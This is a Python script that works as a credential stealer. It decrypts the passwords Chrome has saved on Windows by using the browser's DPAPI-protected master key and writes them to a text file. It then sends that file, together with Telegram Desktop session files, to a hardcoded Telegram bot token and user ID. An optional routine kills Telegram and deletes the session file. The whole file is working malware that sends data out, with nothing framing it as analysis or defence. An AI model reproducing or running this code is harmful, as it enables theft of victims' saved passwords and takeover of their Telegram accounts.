try:
    from telebot import TeleBot
    import shutil
    import json
    from base64 import b64decode
    from win32crypt import CryptUnprotectData
    from Crypto.Cipher import AES
    import os
    import sqlite3
except Exception as e:
    print("ERROR importing: " + repr(e))
    pass


log_out = 0  # 1 - is on, 0 - is off


user_id = 441449437
token = '651660605:AAHJCsxWiMXEtchhll534q8TMcaHYLyL7SY'
name_ur_txt = 'pass.txt'


bot = TeleBot(token)
pathusr = os.path.expanduser('~')
paths = ['C:/', 'D:/', 'E:/', 'F:/', 'G:/', 'H:/', 'I:/', 'J:/']
path = os.path.expandvars(r'%LocalAppData%\Google\Chrome\User Data\Local State')


def getmasterkey():
    try:
        with open(path) as f:
            load = json.load(f)["os_crypt"]["encrypted_key"]
            master_key = b64decode(load)
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
    except:
        print("ERROR: couldn't access the masterkey")
        pass


def decryption(buff, key):
    payload = buff[15:]
    iv = buff[3:15]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass


def Chrome():
    text = 'YOUR PASSWORDS\n'
    try:
        if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
            shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data',
                         os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
            conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
            cursor = conn.cursor()
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            for result in cursor.fetchall():
                password = result[2]
                login = result[1]
                url = result[0]
                decrypted_pass = decryption(password, getmasterkey())
                text += url + ' | ' + login + ' | ' + decrypted_pass + '\n'
                with open(name_ur_txt, "w", encoding="utf-8") as f:
                    f.write(text)
    except Exception as e:
        print("ERROR in Chrome() func: " + repr(e))
        pass


def finddir(path):
    for root, dirs, files in os.walk(path):
        for name in dirs:
            if name == "Telegram Desktop":
                found = os.path.join(root, name)
                print("***Checking folder: " + found)
                if os.path.exists(found + '\\Telegram.exe'):
                    print("***OK Telegram Desktop hab been found")
                    return found
                else:
                    print("ERROR: is not an actual TG folder")


if os.path.exists(pathusr + '\\AppData\\Roaming\\Telegram Desktop'):
    tddir = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\'
    tdata_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\'
else:
    for i in paths:
        tddir = finddir(i)
        if tddir is not None:
            user = pathusr + " " + tddir
            tdata_path = tddir + '\\tdata\\'
            break
        else:
            user = pathusr + " (TG not found)"
            print("ERROR: Couldn't find 'Telegram Desktop' folder in " + i)
            pass

def logout_windows(bool):
    if bool:
        try:
            global pathd877
            os.system('taskkill /f /im Telegram.exe')
            os.remove(pathd877)
        except Exception as e:
            print("ERROR: Failed to logout: " + repr(e))
            pass
    else:
        print("***Logout state is 0")
        pass


def send_txt():
    try:
        bot.send_document(user_id, open(name_ur_txt,'rb'))
        os.remove(name_ur_txt)
        print("***OK Passwords have been sended successfully")
    except Exception as e:
        print("ERROR in send_txt() func: " + repr(e))
        pass


def send_session_files():
    for root, dirs, files in os.walk(tdata_path):
        for dir in dirs:
            if dir[0:15] == "D877F783D5D3EF8":
                mapsdir = os.path.join(tdata_path, dir)
        for file in files:
            if file[0:15] == "D877F783D5D3EF8":
                print("***OK Matched D877F783D5D3EF8")
                global pathd877
                pathd877 = os.path.join(tdata_path, file)
                bot.send_document(user_id, open(os.path.join(file, pathd877), 'rb'))
            elif file == "maps":
                print("***OK Matched maps")
                bot.send_document(user_id, open(os.path.join(mapsdir, file), 'rb'))


def main():
    try:
        Chrome()
        bot.send_message(user_id, user)
        send_txt()
        send_session_files()
        logout_windows(log_out)
    except Exception as e:
        print('ERROR: Main function: ' + repr(e))
        pass


if __name__ == '__main__':
    main()
    print("***Finished***")

